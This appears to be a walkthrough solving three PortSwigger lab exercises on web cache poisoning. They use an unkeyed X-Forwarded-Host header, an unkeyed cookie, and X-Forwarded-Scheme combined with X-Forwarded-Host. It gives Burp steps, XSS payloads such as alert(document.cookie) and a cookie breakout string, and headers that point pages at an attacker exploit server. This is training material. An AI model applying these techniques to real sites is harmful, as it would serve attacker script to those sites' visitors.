<!-- omit in toc -->
# Web cache poisoning with an unkeyed header

<!-- omit in toc -->
## Table of Contents

- [Web cache poisoning with an unkeyed header](#web-cache-poisoning-with-an-unkeyed-header)
- [Web cache poisoning with an unkeyed cookie](#web-cache-poisoning-with-an-unkeyed-cookie)
- [Web cache poisoning with multiple headers](#web-cache-poisoning-with-multiple-headers)

## Web cache poisoning with an unkeyed header
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header

<!-- omit in toc -->
### Solution 
1. With Burp running, load the website's home page
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater.
3. Add a cache-buster query parameter, such as ?cb=1234.
4. Add the ``X-Forwarded-Host`` header with an arbitrary hostname, such as ``example.com``, and send the request.
5. Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at ``/resources/js/tracking.js``.
6. Replay the request and observe that the response contains the header ``X-Cache: hit``. This tells us that the response came from the cache.
7. Go to the exploit server and change the file name to match the path used by the vulnerable response:
```
/resources/js/tracking.js
```
8. In the body, enter the payload alert(document.cookie) and store the exploit.
9. Open the GET request for the home page in Burp Repeater and remove the cache buster.
10. Add the following header, remembering to enter your own exploit server ID:
```
X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
```
11. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
12. To simulate the victim, load the poisoned URL in your browser and make sure that the alert() is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
13. If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved.

## Web cache poisoning with an unkeyed cookie
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie

<!-- omit in toc -->
### Solution
1. With Burp running, load the website's home page.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that the first response you received sets the cookie ``fehost=prod-cache-01``.
3. Reload the home page and observe that the value from the ``fehost`` cookie is reflected inside a double-quoted JavaScript object in the response.
4. Send this request to Burp Repeater and add a cache-buster query parameter.
5. Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response.
6. Place a suitable XSS payload in the ``fehost`` cookie, for example:
```
fehost=someString"-alert(1)-"someString
```
7. Replay the request until you see the payload in the response and ``X-Cache: hit`` in the headers.
8. Load the URL in your browser and confirm the ``alert()`` fires.
9. Go back Burp Repeater, remove the cache buster, and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.

## Web cache poisoning with multiple headers
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers

<!-- omit in toc -->
### Quick Solution
The tricky part here was to understand that we had to use both the ``X-Forwarded-Host`` and the ``X-Forwarded-Scheme`` headers. Once you get that it becomes easy peasy.

<!-- omit in toc -->
### Solution
1. With Burp running, load the website's home page.
2. Go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the ``GET`` request for the JavaScript file ``/resources/js/tracking.js`` and send it to Burp Repeater.
3. Add a cache-buster query parameter and the X-Forwarded-Host header with an arbitrary hostname, such as example.com. Notice that this doesn't seem to have any effect on the response.
4. Remove the ``X-Forwarded-Host`` header and add the ``X-Forwarded-Scheme`` header instead. Notice that if you include any value other than HTTPS, you receive a 302 response. The Location header shows that you are being redirected to the same URL that you requested, but using https://.
5. Add the X-Forwarded-Host: example.com header back to the request, but keep ``X-Forwarded-Scheme: nothttps`` as well. Send this request and notice that the ``Location`` header of the 302 redirect now points to ``https://example.com/``.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:
```
/resources/js/tracking.js
```
7. In the body, enter the payload alert(document.cookie) and store the exploit.
8. Go back to the request in Burp Repeater and set the X-Forwarded-Host header as follows, remembering to enter your own exploit server ID:
```
X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
```
9. Make sure the ``X-Forwarded-Scheme`` header is set to anything other than ``HTTPS``.
10. Send the request until you see your exploit server URL reflected in the response and ``X-Cache: hit`` in the headers.
11. To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in your browser. If the cache was successfully poisoned, you will see the script containing your payload, ``alert(document.cookie)``. Note that the ``alert()`` won't actually execute here.
12. Go back to Burp Repeater, remove the cache buster, and resend the request until you poison the cache again.
13. To simulate the victim, reload the home page in your browser and make sure that the ``alert()`` fires.
14. Keep replaying the request to keep the cache poisoned until the victim visits the site and the lab is solved.